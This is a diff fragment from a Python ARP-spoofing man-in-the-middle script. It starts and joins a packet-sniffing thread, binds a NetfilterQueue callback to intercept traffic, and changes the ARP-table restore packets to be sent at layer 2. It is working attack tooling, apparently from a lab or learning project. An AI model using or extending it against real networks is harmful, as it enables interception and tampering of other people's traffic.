@@ -85,8 +85,7 @@ try:
     thread2.start()
     print(f"\nSent ARPs")
     thread3 = threading.Thread(target=sniff_sniff)
-
-    
+    thread3.start()
 
     nfqueue = NetfilterQueue()                       
     nfqueue.bind(1, q_callback)                        
@@ -96,11 +95,12 @@ except KeyboardInterrupt:
     finished = True  # Signal the thread to stop
     thread1.join() 
     thread2.join() 
+    thread3.join()
     packet = Ether(src=target_MAC, dst=server_MAC) / ARP(op=2, pdst=args.server_ip, psrc=args.target_ip)
-    send(packet, iface=interface)
+    sendp(packet, iface=interface)
     print(f"\nFixed server ARP table")
     packet = Ether(src=server_MAC, dst=target_MAC) / ARP(op=2, pdst=args.target_ip, psrc=args.server_ip)
-    send(packet, iface=interface)
+    sendp(packet, iface=interface)
     print(f"\nFixed Client ARP table")
 except Exception as e:
     print(e)
